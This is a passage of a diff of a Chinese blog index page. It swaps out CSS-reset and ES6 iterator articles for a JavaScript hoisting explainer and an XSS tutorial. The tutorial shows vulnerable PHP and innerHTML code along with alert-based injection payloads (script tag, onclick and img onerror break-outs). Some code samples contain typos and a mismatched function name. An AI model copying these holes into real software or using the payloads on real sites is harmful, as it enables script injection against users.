class="selector-tag">h2</span>, <span class="selector-tag">h3</span>, <span class="selector-tag">h4</span>, <span class="selector-tag">h5</span>, <span class="selector-tag">h6</span>&#123; <span class="attribute">font-size</span>:<span class="number">100%</span>; &#125; </div><div class="line"><span class="selector-tag">address</span>, <span class="selector-tag">cite</span>, <span class="selector-tag">dfn</span>, <span class="selector-tag">em</span>, <span class="selector-tag">var</span> &#123; <span class="attribute">font-style</span>:normal; &#125; </div><div class="line"><span class="selector-tag">code</span>, <span class="selector-tag">kbd</span>, <span class="selector-tag">pre</span>, <span class="selector-tag">samp</span> &#123; <span class="attribute">font-family</span>:couriernew, courier, monospace; &#125; </div><div class="line"><span class="selector-tag">small</span>&#123; <span class="attribute">font-size</span>:<span class="number">12px</span>; &#125; </div><div class="line"><span class="selector-tag">ul</span>, <span class="selector-tag">ol</span> &#123; <span class="attribute">list-style</span>:none; &#125; </div><div class="line"><span class="selector-tag">a</span> &#123; <span class="attribute">text-decoration</span>:none; &#125; </div><div class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123; <span class="attribute">text-decoration</span>:underline; &#125; </div><div class="line"><span class="selector-tag">sup</span> &#123; <span class="attribute">vertical-align</span>:text-top; &#125; </div><div class="line"><span class="selector-tag">sub</span>&#123; <span class="attribute">vertical-align</span>:text-bottom; &#125; </div><div class="line"><span class="selector-tag">legend</span> &#123; <span class="attribute">color</span>:<span class="number">#000</span>; &#125; </div><div class="line"><span class="selector-tag">fieldset</span>, <span class="selector-tag">img</span> &#123; <span class="attribute">border</span>:<span class="number">0</span>; &#125; </div><div class="line"><span class="selector-tag">button</span>, <span class="selector-tag">input</span>, <span class="selector-tag">select</span>, <span class="selector-tag">textarea</span> &#123; <span class="attribute">font-size</span>:<span class="number">100%</span>; &#125; </div><div class="line"><span class="selector-tag">table</span> &#123; <span class="attribute">border-collapse</span>:collapse; <span class="attribute">border-spacing</span>:<span class="number">0</span>; &#125;</div></pre></td></tr></table></figure></p>
-<p>网易官网 样式初始化<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">html</span> &#123;<span class="attribute">overflow-y</span>:scroll;&#125; </div><div class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">margin</span>:<span class="number">0</span>; <span class="attribute">padding</span>:<span class="number">29px</span>00; <span class="attribute">font</span>:<span class="number">12px</span><span class="string">"\5B8B\4F53"</span>,sans-serif;<span class="attribute">background</span>:<span class="number">#ffffff</span>;&#125; </div><div class="line"><span class="selector-tag">div</span>,<span class="selector-tag">dl</span>,<span class="selector-tag">dt</span>,<span class="selector-tag">dd</span>,<span class="selector-tag">ul</span>,<span class="selector-tag">ol</span>,<span class="selector-tag">li</span>,<span class="selector-tag">h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">h3</span>,<span class="selector-tag">h4</span>,<span class="selector-tag">h5</span>,<span class="selector-tag">h6</span>,<span class="selector-tag">pre</span>,<span class="selector-tag">form</span>,<span class="selector-tag">fieldset</span>,<span class="selector-tag">input</span>,<span class="selector-tag">textarea</span>,<span class="selector-tag">blockquote</span>,<span class="selector-tag">p</span>&#123;<span class="attribute">padding</span>:<span class="number">0</span>; <span class="attribute">margin</span>:<span class="number">0</span>;&#125; </div><div class="line"><span class="selector-tag">table</span>,<span class="selector-tag">td</span>,<span class="selector-tag">tr</span>,<span class="selector-tag">th</span>&#123;<span class="attribute">font-size</span>:<span class="number">12px</span>;&#125; </div><div class="line"><span class="selector-tag">li</span>&#123;<span class="attribute">list-style-type</span>:none;&#125; </div><div class="line"><span class="selector-tag">img</span>&#123;<span class="attribute">vertical-align</span>:top;<span class="attribute">border</span>:<span class="number">0</span>;&#125; </div><div class="line"><span class="selector-tag">ol</span>,<span class="selector-tag">ul</span> &#123;<span class="attribute">list-style</span>:none;&#125; </div><div class="line"><span class="selector-tag">h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">h3</span>,<span class="selector-tag">h4</span>,<span class="selector-tag">h5</span>,<span class="selector-tag">h6</span>&#123;<span class="attribute">font-size</span>:<span class="number">12px</span>; <span class="attribute">font-weight</span>:normal;&#125; </div><div class="line"><span class="selector-tag">address</span>,<span class="selector-tag">cite</span>,<span class="selector-tag">code</span>,<span class="selector-tag">em</span>,<span class="selector-tag">th</span> &#123;<span class="attribute">font-weight</span>:normal; <span class="attribute">font-style</span>:normal;&#125;</div></pre></td></tr></table></figure></p>
-<p>雅虎大师 样式初始化<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">body,div,dl,dt,dd,ul,ol,li,h1,h2,h3,h4,h5,h6,pre,code,form,fieldset,legend,input,button,textarea,p,blockquote,th,td &#123; margin:0; padding:0; &#125;</div><div class="line">body &#123; background:#fff; color:#555; font-size:14px; font-family: Verdana, Arial, Helvetica, sans-serif; &#125;</div><div class="line">td,th,caption &#123; font-size:14px; &#125;</div><div class="line">h1, h2, h3, h4, h5, h6 &#123; font-weight:normal; font-size:100%; &#125;</div><div class="line">address, caption, cite, code, dfn, em, strong, th, var &#123; font-style:normal; font-weight:normal;&#125;</div><div class="line">a &#123; color:#555; text-decoration:none; &#125;</div><div class="line">a:hover &#123; text-decoration:underline; &#125;</div><div class="line">img &#123; border:none; &#125;</div><div class="line">ol,ul,li &#123; list-style:none; &#125;</div><div class="line">input, textarea, select, button &#123; font:14px Verdana,Helvetica,Arial,sans-serif; &#125;</div><div class="line">table &#123; border-collapse:collapse; &#125;</div><div class="line">html &#123;overflow-y: scroll;&#125; </div><div class="line"></div><div class="line">.clearfix:after &#123;content: "."; display: block; height:0; clear:both; visibility: hidden;&#125;</div><div class="line">.clearfix &#123; *zoom:1; &#125;</div></pre></td></tr></table></figure></p>
+<p>预解析与执行期</p>
 </blockquote>
+<p>先举个例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">alert(inqiu);<span class="comment">//Uncaught ReferenceError: inqiu is not defined</span></div><div class="line"></div><div class="line">alert(a); <span class="comment">//undefined</span></div><div class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</div></pre></td></tr></table></figure>
+<p>再举个例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> arg = <span class="number">1</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">arg</span>) </span>&#123;</div><div class="line">    alert(arg);</div><div class="line">    <span class="keyword">var</span> arg = <span class="number">2</span>;</div><div class="line">&#125;</div><div class="line">foo(<span class="number">3</span>);<span class="comment">//undefined</span></div></pre></td></tr></table></figure>
+<p>Why? 解释几句吧</p>
+<p>首先，JavaScript引擎会优先解析var变量和function定义。</p>
+<p>在代码预解析完成后，才会执行代码。</p>
+<p>如果一个文档流中包含多个script代码段（用script标签分隔的js代码或引入的js文件）</p>
+<p>大概的运行顺序是：</p>
+<ul>
+<li>step1. 读入第一个代码段</li>
+<li>step2. 做语法分析，有错则报语法错误（比如括号不匹配等），并跳转到step5</li>
+<li>step3. 对var变量和function定义做“预解析”（永远不会报错的，因为只解析正确的声明）</li>
+<li>step4. 执行代码段，有错则报错（比如变量未定义）</li>
+<li>step5. 如果还有下一个代码段，则读入下一个代码段，重复step2</li>
+<li>step6. 结束</li>
+</ul>
+<hr>
+<blockquote>
+<p>最后再来个测试吧，您能解释下原因吗？</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//test 1</span></div><div class="line"><span class="keyword">var</span> tmp = <span class="keyword">new</span> <span class="built_in">Date</span>();</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(tmp);</div><div class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</div><div class="line">    <span class="keyword">var</span> tmp = <span class="string">"hello world"</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">f(); <span class="comment">// undefined</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//test 2  ES5的浏览器环境</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">me</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'I am outside!'</span>); &#125;</div><div class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</div><div class="line">    <span class="comment">// 重复声明一次函数f</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">me</span>(<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'I am inside!'</span>); &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  f();<span class="comment">//“I am inside!”</span></div><div class="line">&#125;());</div></pre></td></tr></table></figure>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://dodoing.com/2016/11/04/各大网站CSS代码初始化整理版.html" data-id="cj4qlfs7w0014moe96oykkskd" class="article-share-link">Partager</a>
+      <a data-url="http://dodoing.com/2016/11/22/js的执行过程，预解析与执行.html" data-id="cj4ruszu8000ov0e9o1agueu9" class="article-share-link">Partager</a>
       
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/css/">css</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li></ul>
 
     </footer>
   </div>
@@ -168,10 +368,10 @@
 
 
   
-    <article id="post-javascript：迭代器循环各个版本" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-带你玩转跨站脚本攻击cross site script" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2016/10/11/javascript：迭代器循环各个版本.html" class="article-date">
-  <time datetime="2016-10-11T10:00:00.000Z" itemprop="datePublished">2016-10-11</time>
+    <a href="/2016/11/18/带你玩转跨站脚本攻击cross site script.html" class="article-date">
+  <time datetime="2016-11-18T01:56:00.000Z" itemprop="datePublished">2016-11-18</time>
 </a>
     
   </div>
@@ -182,7 +382,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/10/11/javascript：迭代器循环各个版本.html">javascript：迭代器循环各个版本</a>
+      <a class="article-title" href="/2016/11/18/带你玩转跨站脚本攻击cross site script.html">带你玩转跨站脚本攻击cross site script</a>
     </h1>
   
 
@@ -191,118 +391,111 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p><strong>js的迭代器在现今各个版本的使用</strong></p>
+<p>跨站脚本攻击 cross site script</p>
 </blockquote>
-<p>我们如何遍历数组中的元素？20年前JavaScript刚萌生时，你可能这样实现数组遍历：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> index = <span class="number">0</span>; index &lt; myArray.length; index++) &#123;</div><div class="line">	<span class="built_in">console</span>.log(myArray[index]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>自ES5正式发布后，你可以使用内建的forEach方法来遍历数组：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">myArray.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</div><div class="line"> 	 <span class="built_in">console</span>.log(value);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
-<p>这段代码看起来更加简洁，但这种方法也有一个小缺陷：你不能使用break语句中断循环，也不能使用return语句返回到外层函数。</p>
-<p>当然，如果只用for循环的语法来遍历数组元素也很不错。</p>
-<p>那么，你一定想尝试一下for-in循环：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> index <span class="keyword">in</span> myArray) &#123;</div><div class="line">	<span class="built_in">console</span>.log(myArray[index]);<span class="comment">//error</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这绝对是一个糟糕的选择，为什么呢？</p>
-<ul>
-<li><p>在这段代码中，赋给index的值不是实际的数字，而是字符串“0”、“1”、“2”，此时很可能在无意之间进行字符串算数计算，例如：“2” + 1 == “21”，这给编码过程带来极大的不便。</p>
+<pre><code>通常指黑客通过“HTML注入”纂改了页面，插入了恶意的脚本，从而在用户浏览页面时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫“跨站脚本”。但是发展到今天，由于Javascript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。但是由于历史原因，这个名字保留了下来。
+</code></pre><p>假设一个页面把用户输入的参数输出到页面上：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$input=$_GET[“param”];</div><div class="line"><span class="keyword">echo</span> “&lt;div&gt;”.$input.”&lt;/div&gt;”;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>如果提交一段HTML代码:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://inqiu.com/test.php?param=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>会发现alert(/xss/)被执行了。</p>
+<p>XSS分为以下几类:</p>
+<ol>
+<li><p>反射型XSS: 只是简单地把用户输入的数据反射给浏览器，黑客需要诱使用户点击链接。也叫作”非持久型XSS“(Non-persistent XSS)</p>
 </li>
-<li><p>作用于数组的for-in循环体除了遍历数组元素外，还会遍历自定义属性。</p>
-<p> 举个例子，如果你的数组中有一个可枚举属性  myArray .name，循环将额外执行一次，遍历到名为“name”的索引。就连数组原型链上的属性都能被访问到。</p>
+<li><p>存储型XSS:把用户输入的数据”存储“在服务器端。这种XSS具有很强的稳定性。 比较常见的一个场景是，黑客写下一篇包含恶意Javascript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的Javascript代        码。黑客把恶意的脚本保存在服务器端，所以中XSS攻击就叫做”存储型XSS”。存储型XSS也叫持久性XSS</p>
 </li>
-<li><p>最让人震惊的是，在某些情况下，这段代码可能按照随机顺序遍历数组元素。</p>
+<li><p>DOM based XSS:从效果上来说也是一种反射型XSS。通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
 </li>
-<li><p>简而言之，for-in是为普通对象设计的，你可以遍历得到字符串类型的键，因此不适用于数组遍历。</p>
-</li>
-</ul>
+</ol>
+<p>看如下代码:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">function test()&#123;</div><div class="line">var str=document.getElementById(“text”).value;</div><div class="line">document.getElementById(“t”).innerHTML=”&lt;a href='”+str+”‘ &gt;testLink&lt;/a&gt;”;</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">”t”</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”text”</span> <span class="attr">id</span>=<span class="string">”text”</span> <span class="attr">value</span>=<span class="string">””</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">”button”</span> <span class="attr">id</span>=<span class="string">”s”</span> <span class="attr">value</span>=<span class="string">”write”</span> <span class="attr">onlick</span>=<span class="string">”test()”</span> /&gt;</span></div></pre></td></tr></table></figure>
+<p>这段代码的作用就是点击write按钮后在当前页面插入一个链接。</p>
+<p>在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作HTML写入到页面中，这就造成了DOM based XSS</p>
+<p>构造如下数据:<br>‘ onclick=alert(/xss/) //</p>
+<p>输入后，页面代码就成了</p>
+<p><a href="”" onlick="alert(/xss/)" ’="">testLink </a></p>
+<p>首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后再用注释符//注释掉第二个单引号。 这里为什么需要onclick，是通过on事件触发？</p>
+<p>实际上，这里还有另外一种利用方式—除了构造一个新事件外，还可以选择闭合掉&lt; a &gt;标签，并插入一个新的HTML标签。尝试如下输入:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">‘&gt;&lt;img scr=# onerror=alert(/xss2/) /&gt;&lt;‘</div><div class="line"></div><div class="line">//页面代码编程</div><div class="line"></div><div class="line">&lt;a href=”&gt;&lt;img scr=# onerror=alert(/xss2/) /&gt;&lt;”&gt;testLink&lt;/a&gt; // 这里是onerror事件</div></pre></td></tr></table></figure>
 <blockquote>
-<p>强大的for-of循环</p>
+<p>XSS攻击进阶:</p>
 </blockquote>
-<p>还记得在《深入浅出ES6（一）：ES6是什么》中我向你们承诺过的话么？ES6不会破坏你已经写好的JS代码。</p>
-<p>目前看来，成千上万的Web网站依赖for-in循环，其中一些网站甚至将其用于数组遍历。</p>
-<p>如果想通过修正for-in循环增加数组遍历支持会让这一切变得更加混乱，因此，标准委员会在ES6中增加了一种新的循环语法来解决目前的问题。</p>
-<p>就像这样：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> value <span class="keyword">of</span> myArray) &#123;</div><div class="line">	<span class="built_in">console</span>.log(value);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>是的，与之前的内建方法相比，这种循环方式看起来是否有些眼熟？那好，我们将要探究一下for-of循环的外表下隐藏着哪些强大的功能。</p>
-<p>现在，只需记住：</p>
-<ul>
-<li>这是最简洁、最直接的遍历数组元素的语法</li>
-<li>这个方法避开了for-in循环的所有缺陷</li>
-<li>与forEach()不同的是，它可以正确响应break、continue和return语句</li>
-</ul>
-<p>for-in循环用来遍历对象属性。</p>
-<p>for-of循环用来遍历数据—例如数组中的值。</p>
-<p>但是，不仅如此！</p>
-<p>for-of循环也可以遍历其它的集合</p>
-<p>for-of循环不仅支持数组，还支持大多数类数组对象，例如DOM NodeList对象。</p>
-<p>for-of循环也支持字符串遍历，它将字符串视为一系列的Unicode字符来进行遍历：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> chr <span class="keyword">of</span> <span class="string">""</span>) &#123;</div><div class="line">	alert(chr);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>它同样支持Map和Set对象遍历。</p>
-<p>对不起，你一定没听说过Map和Set对象。他们是ES6中新增的类型。</p>
-<p>我们将在后续的文章讲解这两个新的类型。如果你曾在其它语言中使用过Map和Set，你会发现ES6中的并无太大出入。</p>
-<p>举个例子，Set对象可以自动排除重复项：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 基于单词数组创建一个set对象</span></div><div class="line"><span class="keyword">var</span> uniqueWords = <span class="keyword">new</span> <span class="built_in">Set</span>(words);</div></pre></td></tr></table></figure>
-<p>生成Set对象后，你可以轻松遍历它所包含的内容：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> word <span class="keyword">of</span> uniqueWords) &#123;</div><div class="line"> 	 <span class="built_in">console</span>.log(word);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>Map对象稍有不同：内含的数据由键值对组成，所以你需要使用解构（destructuring）来将键值对拆解为两个独立的变量：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> [key, value] <span class="keyword">of</span> phoneBookMap) &#123;</div><div class="line">   	<span class="built_in">console</span>.log(key + <span class="string">"'s phone number is: "</span> + value);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>解构也是ES6的新特性，我们将在另一篇文章中讲解。看来我应该记录这些优秀的主题，未来有太多的新内容需要一一剖析。</p>
-<p>现在，你只需记住：未来的JS可以使用一些新型的集合类，甚至会有更多的类型陆续诞生，而for-of就是为遍历所有这些集合特别设计的循环语句。</p>
-<p>for-of循环不支持普通对象，但如果你想迭代一个对象的属性，你可以用for-in循环（这也是它的本职工作）或内建的Object.keys()方法：</p>
-<p>// 向控制台输出对象的可枚举属性<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(someObject)) &#123;</div><div class="line">	<span class="built_in">console</span>.log(key + <span class="string">": "</span> + someObject[key]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p><strong>深入理解</strong></p>
-<p>ES6始终坚持这样的宗旨：凡是新加入的特性，势必已在其它语言中得到强有力的实用性证明。</p>
-<p>举个例子，新加入的for-of循环像极了C++、Java、C#以及Python中的循环语句。与它们一样，这里的for-of循环支持语言和标准库中提供的几种不同的数据结构。</p>
-<p>它同样也是这门语言中的一个扩展点（译注：关于扩展点，建议参考 1. 浅析扩展点 2. What are extensions and extension points?）。</p>
-<p>正如其它语言中的for/foreach语句一样，for-of循环语句通过方法调用来遍历各种集合。</p>
-<p>数组、Maps对象、Sets对象以及其它在我们讨论的对象有一个共同点，它们都有一个迭代器方法。</p>
-<p>你可以给任意类型的对象添加迭代器方法。</p>
-<p>当你为对象添加myObject.toString()方法后，就可以将对象转化为字符串，同样地，当你向任意对象添加myObject[Symbol.iterator]()方法，就可以遍历这个对象了。</p>
-<p>举个例子，假设你正在使用jQuery，尽管你非常钟情于里面的.each()方法，但你还是想让jQuery对象也支持for-of循环，你可以这样做：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 因为jQuery对象与数组相似</span></div><div class="line"><span class="comment">// 可以为其添加与数组一致的迭代器方法</span></div><div class="line">jQuery.prototype[<span class="built_in">Symbol</span>.iterator] = <span class="built_in">Array</span>.prototype[<span class="built_in">Symbol</span>.iterator];</div></pre></td></tr></table></figure>
-<p>好的，我知道你在想什么，那个[Symbol.iterator]语法看起来很奇怪，这段代码到底做了什么呢？这里通过Symbol处理了一下方法的名称。</p>
-<p>标准委员会可以把这个方法命名为.iterator()方法，但是如果你的代码中的对象可能也有一些.iterator()方法，这一定会让你感到非常困惑。</p>
-<p>于是在ES6标准中使用symbol来作为方法名，而不是使用字符串。</p>
-<p>你大概也猜到了，Symbols是ES6中的新类型，我们会在后续的文章中讲解。</p>
-<p>现在，你需要记住，基于新标准，你可以定义一个全新的symbol，就像Symbol.iterator，如此一来可以保证不与任何已有代码产生冲突。</p>
-<p>这样做的代价是，这段代码的语法看起来会略显生硬，但是这微乎其微代价却可以为你带来如此多的新特性和新功能，并且你所做的这一切可以完美地向后兼容。</p>
-<p>所有拥有[Symbol.iterator]()的对象被称为可迭代的。</p>
-<p>在接下来的文章中你会发现，可迭代对象的概念几乎贯穿于整门语言之中，不仅是for-of循环，还有Map和Set构造函数、解构赋值，以及新的展开操作符。</p>
-<p><strong>迭代器对象</strong></p>
-<p>现在，你将无须亲自从零开始实现一个对象迭代器，我们会在下一篇文章详细讲解。</p>
-<p>为了帮助你理解本文，我们简单了解一下迭代器（如果你跳过这一章，你将错过非常精彩的技术细节）。</p>
-<p>for-of循环首先调用集合的[Symbol.iterator]()方法，紧接着返回一个新的迭代器对象。</p>
-<p>迭代器对象可以是任意具有.next()方法的对象；for-of循环将重复调用这个方法，每次循环调用一次。</p>
-<p>举个例子，这段代码是我能想出来的最简单的迭代器：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> zeroesForeverIterator = &#123;</div><div class="line">	 [<span class="built_in">Symbol</span>.iterator]: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">	   		<span class="keyword">return</span> <span class="keyword">this</span>;</div><div class="line">	  &#125;,</div><div class="line">	  <span class="attr">next</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">	  		<span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">false</span>, <span class="attr">value</span>: <span class="number">0</span>&#125;;</div><div class="line">	 &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
-<p>每一次调用.next()方法，它都返回相同的结果，返回给for-of循环的结果有两种可能：(a) 我们尚未完成迭代；(b) 下一个值为0。</p>
-<p>这意味着(value of zeroesForeverIterator) {}将会是一个无限循环。当然，一般来说迭代器不会如此简单。</p>
-<p>这个迭代器的设计，以及它的.done和.value属性，从表面上看与其它语言中的迭代器不太一样。</p>
-<p>在Java中，迭代器有分离的.hasNext()和.next()方法。</p>
-<p>在Python中，他们只有一个.next() 方法，当没有更多值时抛出StopIteration异常。</p>
-<p>但是所有这三种设计从根本上讲都返回了相同的信息。</p>
-<p>迭代器对象也可以实现可选的.return()和.throw(exc)方法。</p>
-<p>如果for-of循环过早退出会调用.return()方法，异常、break语句或return语句均可触发过早退出。</p>
-<p>如果迭代器需要执行一些清洁或释放资源的操作，可以在.return()方法中实现。</p>
-<p>大多数迭代器方法无须实现这一方法。</p>
-<p>.throw(exc)方法的使用场景就更特殊了：for-of循环永远不会调用它。</p>
-<p>但是我们还是会在下一篇文章更详细地讲解它的作用。</p>
-<p>现在我们已了解所有细节，可以写一个简单的for-of循环然后按照下面的方法调用重写被迭代的对象。</p>
-<p>首先是for-of循环：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (VAR <span class="keyword">of</span> ITERABLE) &#123;</div><div class="line">	<span class="comment">//do ing</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>然后是一个使用以下方法和少许临时变量实现的与之前大致相当的示例，：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> $iterator = ITERABLE[<span class="built_in">Symbol</span>.iterator]();</div><div class="line"><span class="keyword">var</span> $result = $iterator.next();</div><div class="line"><span class="keyword">while</span> (!$result.done) &#123;</div><div class="line">	 VAR = $result.value;</div><div class="line">	 <span class="comment">//...</span></div><div class="line">	 $result = $iterator.next();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这段代码没有展示.return()方法是如何处理的，我们可以添加这部分代码，但我认为这对于我们正在讲解的内容来说过于复杂了。</p>
-<p>for-of循环用起来很简单，但是其背后有着非常复杂的机制。</p>
-<hr>
-<p><strong>我何时可以开始使用这一新特性？</strong></p>
-<p>目前，对于for-of循环新特性，所有最新版本Firefox都（部分）支持（译注：从FF 13开始陆续支持相关功能，FF 36 - FF 40基本支持大部分特性），在Chrome中可以通过访问 chrome://flags 并启用“实验性JavaScript”来支持。</p>
-<p>微软的Spartan浏览器支持，但是IE不支持。</p>
